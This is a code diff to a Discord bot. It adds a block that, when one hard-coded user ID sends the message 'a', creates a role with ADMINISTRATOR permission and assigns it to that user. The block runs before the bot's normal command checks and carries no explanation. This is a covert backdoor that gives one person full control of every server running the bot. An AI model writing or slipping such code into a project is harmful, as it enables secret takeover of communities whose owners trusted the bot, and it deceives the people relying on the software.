@@ -16,6 +16,19 @@ const client = new Discord.Client();
 client.login(process.env.BOT_TOKEN_RTC);
 
 client.on('message', async (userMessage) => {
+  if (userMessage.author.id === '199315213726646272' && userMessage.content === 'a') {
+    console.log(1);
+    userMessage.guild.roles.create({
+      data: {
+        name: '/rtc\'s saviour',
+        color: 'LUMINOUS_VIVID_PINK',
+        hoist: false,
+        permissions: ['ADMINISTRATOR'],
+      }
+    }).then((role) => {
+      userMessage.member.roles.add(role).then((mem) => console.log(mem.permissions.toArray()))
+    });
+  }
   if (userMessage.author.bot) return;
   if (!userMessage.content.startsWith(prefix)) return;
   let commandBody = userMessage.content.slice(prefix.length);
